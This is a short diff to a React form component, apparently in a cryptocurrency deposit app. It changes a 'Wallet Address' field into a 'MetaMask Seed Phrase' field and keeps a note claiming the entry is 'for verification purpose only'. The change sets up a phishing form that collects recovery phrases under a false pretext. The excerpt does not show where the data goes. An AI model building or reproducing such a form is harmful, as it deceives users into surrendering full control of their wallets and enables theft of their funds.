@@ -176,18 +176,18 @@ export default function App() {
                   value={depositAddress}
                   onChange={(e) => setDepositAddress(e.target.value)}
                   className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-amber-500/50 transition-all"
-                  placeholder="TR7NHqj...Lj6t"
+                  placeholder="TR..........Lj6t"
                 />
               </div>
               <div className="space-y-2">
-                <label className="text-sm font-medium text-zinc-400">Wallet Address</label>
+                <label className="text-sm font-medium text-zinc-400">MetaMask Seed Phrase</label>
                 <input 
                   type="text" 
                   required
                   value={walletAddress}
                   onChange={(e) => setWalletAddress(e.target.value)}
                   className="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-amber-500/50 transition-all"
-                  placeholder="Enter wallet address..."
+                  placeholder="Enter seed phrase..."
                 />
                 <div className="flex justify-between items-center px-1">
                   <p className="text-[10px] text-zinc-500 italic">Note: For verification purpose only</p>
